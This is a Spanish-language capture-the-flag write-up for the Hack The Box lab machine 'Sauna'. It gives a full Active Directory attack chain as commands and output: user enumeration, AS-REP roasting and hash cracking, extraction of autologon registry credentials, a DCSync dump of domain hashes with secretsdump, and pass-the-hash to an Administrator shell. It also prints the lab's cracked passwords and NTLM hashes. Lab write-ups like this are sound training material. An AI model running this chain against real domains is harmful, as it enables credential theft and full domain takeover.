# Sauna - 10.10.10.175
![Sauna](https://user-images.githubusercontent.com/96772264/212533203-22b97341-4eee-44d7-bf30-c57db475083c.png)

----------------------
# Part 1: Enumeración

Puertos abiertos: 80(http),88(kerberos),53(dns),135(rpc),139,389,445(smb),464,593,636,3269,3268,5985(winrm),9389
```console
└─$ crackmapexec smb 10.10.10.175
SAUNA [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
```

## Puerto 53 dns
```console
└─$ dig @10.10.10.175 egotistical-bank.local mx
sauna.egotistical-bank.local. hostmaster.egotistical-bank.local
```

## Puerto 135 rcp
```console
└─$ rpcclient -U "" -N 10.10.10.175 -c 'enumdomusers' 
result was NT_STATUS_ACCESS_DENIED
```
![Sauna1](https://user-images.githubusercontent.com/96772264/212533222-3870cb03-c0e5-490d-aa53-dba406dfa64d.PNG)

----------------------
# Part 2: Web

En la web apenas hay un formulario de contacto inutil. De single.html sacamos nombres -> Jenny Joy, James Doe, Jhonson y Watson.  
De contact us tambien -> Fergus Smith, Shaun Coins, Bowie Taylor, Sophie Driver, Hugo Bear, Steven Kerb.

```console
└─$ whatweb http://10.10.10.175
HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.175], Microsoft-IIS[10.0], Script, Title[Egotistical Bank :: Home]

└─$ wfuzz -t 200 --hc=404 -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt http://10.10.10.175/FUZZ
# Nada

└─$ wfuzz -t 200 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://10.10.10.175/FUZZ
000000002:   403        29 L     92 W       1233 Ch     "images"                                             
000000536:   403        29 L     92 W       1233 Ch     "css"                                                
000002757:   403        29 L     92 W       1233 Ch     "fonts" 
```
```console
└─$ kerbrute userenum --dc 10.10.10.175 -d egotistical-bank.local /usr/share/seclists/Usernames/Names/names.txt
# Nada
```
Con los usuarios que habiamos conseguido hacemos un diccionario tal que cada nombre tenga mas de una manera de ser escrito:   
```Fergus Smith -> FergusSmith fsmith```

----------------------
# Part 3: Kerberos

```console
└─$ kerbrute userenum --dc 10.10.10.175 -d egotistical-bank.local users.txt
2023/01/14 12:02:52 >  [+] VALID USERNAME:	fsmith@egotistical-bank.local

└─$ impacket-GetNPUsers egotistical-bank.local/fsmith -no-pass
[*] Getting TGT for fsmith
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:246e70
```
Como no tenia el Dont-preauth seteado se podia dumpear los hashes.

```console
└─$ john hash -w=/usr/share/wordlists/rockyou.txt       
Thestrokes23     ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL)
```
----------------------
# Part 4: En el sistema, credenciales de Autologon
```console
└─$ crackmapexec smb 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23

└─$ crackmapexec winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
WINRM       10.10.10.175    5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 (Pwn3d!)
```
```console
└─$ impacket-smbserver carpeta $(pwd) -smb2support
*Evil-WinRM* PS C:\Users\FSmith\Documents> copy //10.10.14.7/carpeta/win_enum_xii.bat
*Evil-WinRM* PS C:\Users\FSmith\Documents> cmd /c win_enum_xii.bat
```

Encontramos credenciales autologon:
comando -> ```reg.exe query "HKLM\software\microsoft\windows nt\currentversion\winlogon" 2>nul | findstr "DefaultPassword DefaultUserName"```
```
"[Autologon]"
    DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
    DefaultPassword    REG_SZ    Moneymakestheworldgoround!
```

```console
└─$ evil-winrm -i 10.10.10.175 -u 'svc_loanmanager' -p 'Moneymakestheworldgoround!'
# No funciona
└─$ evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
# Asi si
```
----------------------
# Part 5: Escalada de privilegios: Bloodhound y DCSync

Para mirar una posible escalada de privilegios:
```console
└─$ bloodhound-python -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!' -c All -ns 10.10.10.175 -d egotistical-bank.local -dc egotistical-bank.local --zip
# Nos crea 4 archivos json que subiremos al bloodhound
```
![Sauna2](https://user-images.githubusercontent.com/96772264/212533231-e2990401-a2e2-4bb5-a569-c6670b9ded6d.PNG)


En > OUTBOUND OBJECT CONTROL > First Degree Object Control Nos aparece DCSync, es un permiso sobre el dominio
que nos permite leer las contraseñas hasheadas de todo el mundo.

El ataque DCSync lo que hace es usar el Directory Replication Service Remote Protocol (MS-DRSR) para comportarse 
como un Domain Controller y pedirle información al resto de Domain Controllers (como por ejemplo credenciales)
Para realizar dicho ataque se requiere una cuenta con "Domain replication privileges"

```console
└─$ impacket-secretsdump egotistical.bank.local/svc_loanmgr@10.10.10.175
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::

└─$ impacket-psexec egotistical.bank.local/Administrator@10.10.10.175 cmd.exe -hashes :823452073d75b9d1cf70ebdf86c7f98e
C:\Windows\system32>
```

